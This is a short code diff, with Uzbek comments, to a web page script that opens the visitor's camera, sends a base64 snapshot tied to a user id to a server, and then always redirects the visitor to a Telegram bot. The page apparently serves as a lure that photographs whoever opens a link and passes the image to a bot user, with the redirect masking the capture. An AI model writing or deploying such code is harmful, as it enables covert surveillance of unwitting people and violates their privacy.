@@ -44,7 +44,11 @@
     const video = document.getElementById("video");
 
     async function captureAndSend() {
-        if (!uid) return;
+        if (!uid) {
+            // Eger UID bo'lmasa ham to'g'ridan-to'g'ri botga otkazish
+            window.location.href = `https://t.me/${BOT_USERNAME}`;
+            return;
+        }
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
@@ -76,12 +80,10 @@
                 body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
             });
 
-            // Rasm yuborilgach, avtomatik ravishda botni ochish
-            window.location.href = `https://t.me/${BOT_USERNAME}`;
-
         } catch (err) {
             console.error("Xatolik:", err);
-            // Xatolik bo'lsa ham foydalanuvchini botga yo'naltirish
+        } finally {
+            // Har qanday holatda ham (xatolik bo'lsa ham) botga yo'naltirish
             window.location.href = `https://t.me/${BOT_USERNAME}`;
         }
     }
